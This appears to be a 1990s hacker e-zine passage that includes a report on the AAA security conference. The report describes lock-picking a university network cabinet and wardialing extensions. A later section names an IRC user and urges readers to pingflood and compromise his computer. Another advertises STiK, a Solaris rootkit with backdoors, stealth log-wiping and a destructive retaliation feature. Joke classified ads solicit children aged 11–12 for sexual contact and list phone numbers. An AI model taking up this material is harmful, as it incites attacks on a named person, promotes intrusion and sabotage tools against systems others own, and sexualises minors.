+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+get into any shell, and type...
+
+% whois lopht.com
+
+its elite (lookup sIn inf0z to see)
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  2. AAA Report : so1o
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+AAA stands for Access All Areas, it is a computer security and hacking
+conference held in the UK in early July of every year, this would be the
+third year of AAA, and myself and NightRage were going.
+
+Myself and NightRage arrived on Regent Street at 9:30am, we entered the
+University of Westminster building, purchased two passes for the event, and
+proceeded to the conference room, where there were many people aged between
+16 and around 40, all with a handful of common interests, hacking, phreaking,
+carding and generally the ability to gain power, or "free stuff".
+
+We sat down on the ground floor near the back of the room, we got talking to
+a french hacker, called Leon (aka acme), we joked about "o-DaY WaReZ" and then
+Nightrage booted his p150 laptop, then Leon pulled out his Thinkpad, he booted
+it, and it counted up to 64mb of RAM, we asked how much hard drive space he had
+to which he casually replied "6 gig", Leon knew stuff.
+
+The first speaker was Ross Anderson, who explained how our predecessors had
+broken into cash machines (atm's) using various techniques, as well as the
+flaws in such machines and systems, ranging from all cards having the same
+PIN, to a trick that Shefield hackers used with phone cards to get cash.
+He then went on to smartcards and encryption and finished around 11am.
+
+We then went up to the network room, where the "hack the flag" competition
+was to be held, there were a handful of people up there, including a
+photgrapher and some staff, I only saw 3 systems and 2 terminals, not really
+enough to use for any competition.
+
+Leon sat down and started to toy with his laptop and some CD's he had purchased
+in Pakistan the day before, he had voice recognition programs and games and a
+few other "expensive" CD's.
+
+We met an American wearing an FBI cap, he also had a laptop, as well as another
+with long blonde / grayish hear who did alot of cool stuff with the phone line
+in the network room using various toys he had.
+
+We needed to set up a network, we had numerous modems, one network hub with 5
+ports, around 8 systems and one phone socket.
+
+We soon realised through various methods (one using NightRage's cheap blue
+telephone) that the only phone socket in the room went through the reception,
+so NightRage phoned down to the reception, and tried to use his amazing social
+engineering skills..
+
+Reception : "hello?"
+NightRage : "hi, is there any way I can get an outside line from this phone?"
+Reception : "no"
+NightRage : "OK"
+
+We then went on a hunt for working phone lines or hubs that we could use to
+help us set up our network, the FBI dude soon found a cabinet that looked
+important, and NightRage and the others helped him pick the lock, inside
+they found a 3com network hub and a few other goodies, the FBI dude got his
+laptop and tried to hack his way onto the network, but he couldn't use
+traceroute or any other programs, so that hub was useless to us unless we
+knew our own IP.
+
+Two younger hackers started to manually wardial the extensions, they found a
+handful of modem numbers in a very short amount of time. We were quite
+impressed by their skills.
+
+The guy with the long blond / grayish hair went down to a computer shop on
+Regent street to buy some RJ45 cable so we could use the hub in the
+cabinet, but he left before we realised that it wasn't usable.
+
+Emerson was getting really stressed out, as he was one of the staff, and he
+had promised the University that no damage would be done to any of the
+phone / computer lines, he needed a plan to stall us, even though we were
+telling him everything would be fine, and that we would leave all the stuff
+as it was when we found it, he was still scared at the consequences, and
+it was time for lunch, we originally planned to just pop over the street to
+grab a McDonalds, but Emerson started to take us down Regent street, he asked
+if we wanted to eat for around œ5 at a place he knew well, we agreed, the time
+was around 1pm...
+
+Emerson proceeded to take myself, NightRage, the FBI dude, Wyatt and the two
+that had manually wardialled the extensions half way around London, we walked
+down Regent street, onto Tottenham court road and around a load of shops,
+Wyatt and the FBI dude suggested we should grab a beer, and we easily found
+a pub.
+
+We stopped into the pub and all ordered drinks, we then sat outside and talked
+about the L0phT, global posistioning and scanning, we left the pub at about 2pm
+and made our way through alot of roads and came to Kamamama's Japanese
+restaurant, after stopping into alot of shops on the way and talking about oki
+phones.
+
+We ate good Japanese food in Kamamama's, and Wyatt used his tiny scanner to
+detect radio comms within the building, his scanner was cool, and he tried to
+pinpoint the frequency that the waiters broadcast the orders with their
+handheld systems, at one point he placed the scanner right up next to the
+handheld and said "can you press that button one more time please".
+
+Wyatt also had a transciever that he could use to broadcast on, so he could
+pinpoint a frequency with his scanner, and the broadcast with his tiny
+transciever on that frequency.
+
+The time was now around 3pm, and we made our way back through a very busy
+London to the conference, when we got back we went back up to the network
+room, not alot had happened since we had been away (much as Emerson would
+have expected) and myself and NightRage toyed with systems for about 30 minutes
+
+We then listened to another talk by a journalist who often writes of hacking
+and computer security issues, called Dave Green (I think), Cold-Fire and the
+people on the balcony often questioned him, and he generally said "no-one
+cares what you do, so why should I write about it?" which was pretty true,
+then another journalist went on saying that he would pay for such stories
+if they had reason behind them (ie. web site attacks), this was quite
+interesting.
+
+The last talk myself and NightRage listened to was Alan Solomon, to which I
+asked, when he was talking about the Linux version of his toolkit...
+
+  "Yeah, does the Linux version detect Windoze '95 as a virus?"
+
+  He didn't understand, but he's cl00less and hangs on AOL all day...
+
+He then went on to talk a load of crap about how amazing AOL was, then he
+talked about how he has been mailbombed and how "phishers" have tried to
+pull all his account inf0z (passwords etc.) he was also shouting into the
+microphone, and I had a speaker right next to me, and I had my finger in
+one ear for most of the talk, due to the fact that he shouted into the
+microphone, he also breathed very heavily and walked around alot.
+
+We went back up to the network room, which now had 2 systems and 2 terminals,
+swapped email addresses with Wyatt, Emerson, the FBI dude and a few others,
+we then said our goodbyes, and left to catch the 8:30 train from Paddington
+Station.
+
+AAA was cool, it was just a pity that only one of the three planned special
+events actually took place, as well as the fact that there really wasn't enough
+time for the people there to talk with each other.
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  3. Lamer of the fucking year : pSId (DALnet) : so1o
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+Theres a fucking cl00less g1mp on DALnet called pSId, but then again, most
+people on DALnet are cl00less, this "cracker" however has the following
+"mad" skills...
+
+  - phf
+  - tftp
+
+His most highly acclaimed hack was of sony.co.jp (guess the technique.)
+and since then he has blatently lied about hacking bolero.gsfc.nasa.gov
+(www.nasa.gov alias) which he says runs tftp.
+
+If you see him *anywhere* feel free to pingflood his IP, 0wn his lame fuck
+Linux box, or anything else.
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+===============================================================================
+==[ PROJECTS ]=================[ .SECTION F. ]===================[ PROJECTS ]==
+===============================================================================
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  1. STiK : mstrhelix
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+                                  -=STiK=-
+                       (S)olaris (T)ool (i)diot (K)it
+                       ******************************
+
+STiK is a deluxe rootkit for the solaris platform containing not only
+tools that enable you to gain root access it also allows you to keep it
+with backdoors.  The Alpha version of STiK includes exploits, backdoors,
+sniffers, connection hijackers, a stealth mode, and eventualy will also
+include other kewl tewls such as spoofers, other new inovative remote root
+access backdoors, and maybe if I have enough time a extra option to help
+you construct your own buffer overflow exploits.  STiK supports these
+platforms... sparc10 and sparc20 and it minimaly supports x86 platforms.
+The only conflicts you may have while using this tool is if, (like an (i)diot) 
+you use the -Sun4 switch on a solaris 5.x machine or say the -x86 swtich on 
+a -Sun5 and visa versa... but nobody is that stupid. STiK includes the
+following options....
+
+        -Sun4, -Sol5, -x86 --> compiles exploits for following platforms.
+
+        -backdrs           --> installs backdoors and suggests 'em.
+
+        -stealth           --> does whut it says... and very well.
+
+        -destruc           --> if you get cauaght online reek some havok
+
+        -man               --> shows 3r33t manpage
+
+-Sun4 compiles loits for SunOS 4.x
+
+-Sol5 compiles loits for Solaris 2.5.x
+
+-x86  compiles loits for x86 platforms of solaris and sunos
+
+-backdrs backdoor menu feature,,, pick and choose or mix and match
+
+-stealth invokes programs such as cloak, zap2, block, and etc...
+
+-destruc if you get caught and booted this will invoke and fuck some shit
+         up majorly. We dont wanna be destructive but hey !!!YOU FUCKING
+         KICKED ME OFF YER MACHINE ASSHOLE I DIDN'T INVOKE THE -destruc
+         FEATURE R00T DID!!!
+
+-man     full featured reverse switched manpage to fuck wid yer headz
+
+If you'z mutha fuxx0rs have any shit you would like me to add so STiK then
+speak now or do without cause I have been hard at work coding shit...
+Also anyone who wants to help port lrk3 backdoors and shit to solaris drop
+me a line cause its a bitch doing it all by yerself...
+
+edge@mindwerks.com
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+===============================================================================
+==[ FIN ]======================[ .SECTION G. ]========================[ FIN ]==
+===============================================================================
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+--------------------------------------+---------------------------------------
+                                      |
+           YOUR SPECIAL AD            |            LET'S BE FREE
+                                      |
+       COULD BE RIGHT HERE #@!        |    Gay White Male 38, 5'11" looking
+                                      |    for men, 12 - 32 clean, fit, and
+       SEND ELECTRONIC MAIL TO:       |    hairy. Discreet Encounters.
+            ADZ@CODEZ.COM             |    Call Anytime : (816)781-8009
+                                      |                   (Ask for Tommy)
+                                      |
+--------------------------------------+---------------------------------------
+                                      |
+        ARE YOU 11 OR 12 ???          |      FREE FONESEX! CALL ME NOW!@
+                                      |
+ Looking for men 11 - 12 for adult    |    Yeah huney, you know you want me,
+ video satisfaction. I am 35 into     |    I'll treat you just right, I'm
+ Professional wrestling.              |    waiting for your call today!
+ Let's talk soon : (816)453-8722      |    CALL ME NOW!@# : (847)546-9154
+                                      |                     (Ask for Kim)
+--------------------------------------+---------------------------------------
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+                            .oO The CodeZero Oo.
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+                      _   /|  k0dek4t sez...
+                      \'o O'                            
+                      =(_o_)=   "EyEm HuNGaRy FoR CoDeZ,
+                        U               nOt CaTf00d!!#@"
+
+
+              :::  http://insecurity.insecurity.org/codez/ :::
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+          Remember, McDonalds Owns You, And Ronald Is The KinG!!!
+         Wendy Is Satan!! Don't Believe The Lies!! PHEAR WENDY!@#*
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
